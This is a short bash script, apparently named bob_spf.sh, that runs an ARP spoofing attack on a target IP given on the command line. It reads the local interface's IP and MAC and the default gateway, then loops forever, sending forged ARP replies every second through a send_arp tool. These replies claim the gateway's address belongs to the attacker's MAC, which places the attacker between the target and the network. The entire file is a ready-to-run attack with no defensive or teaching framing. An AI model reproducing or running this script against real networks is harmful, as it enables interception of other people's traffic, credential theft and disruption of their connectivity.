#! /bin/bash

if [ $# -ne 1 ];
then
	echo "Invalid input!!"
	echo -e "please input \"./bob_spf.sh [Target_IP]\""
	exit
fi


IFACE=ens33
MYIP=$( ifconfig ${IFACE} | grep "inet addr" | awk -F ' ' '{print $2}' | cut -d ':' -f2 )
MYMAC=$( ifconfig ${IFACE} | grep HWaddr | awk -F ' ' '{print $5}')
GATEWAY=$(netstat -rn | grep -e '^0\.0\.0\.0' | awk '{print $2}')

while true;
do

	#send ARP
	arping -q -I ${IFACE} -c 1 ${1}

	#check target MAc
	TMAC=$( arp -an | grep -w "${1}" | awk -F ' ' '{print $4}' )


	#echo -e "\n=================Information======================="
	#echo "${IFACE}  IP: ${MYIP} - MAC: ${MYMAC} GATEWAY: ${GATEWAY}"
	#echo "target IP : ${1} target MAC : ${TMAC}"

	echo "======send ARP Packet======"
	send_arp ${GATEWAY} ${MYMAC} ${1} ${TMAC} ens33 ${MYMAC} ${TMAC}
	sleep 1
done;


